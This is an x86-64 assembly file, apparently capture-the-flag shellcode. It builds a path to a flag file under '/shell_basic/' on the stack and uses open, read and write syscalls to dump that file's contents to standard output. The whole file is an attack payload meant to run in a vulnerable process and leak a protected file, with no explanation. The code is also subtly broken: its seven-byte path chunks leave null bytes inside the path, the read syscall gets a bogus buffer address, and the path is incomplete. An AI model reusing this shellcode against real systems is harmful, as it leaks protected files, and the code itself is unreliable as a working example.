global _open

_open:
	push 0x0
	mov rax, 0x676E6F6F6F6F6F
	push rax
	mov rax, 0x676E6F6F6F6F6F
	push rax
	mov rax, 0x6D616E5F67616C
	push rax
	mov rax, 0x662F6369736162
	push rax
	mov rax, 0x5F6C6C6568732F
	push rax

	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 2
	syscall
 
	mov rdi, rax
	mov rsi, 0x30
	mov rdx, 0x30
	mov rax, 0
	syscall

	mov rdi, 1
	mov rax, 1
	syscall	

	xor rdi, rdi
	mov rax, 0x3c
	syscall
	
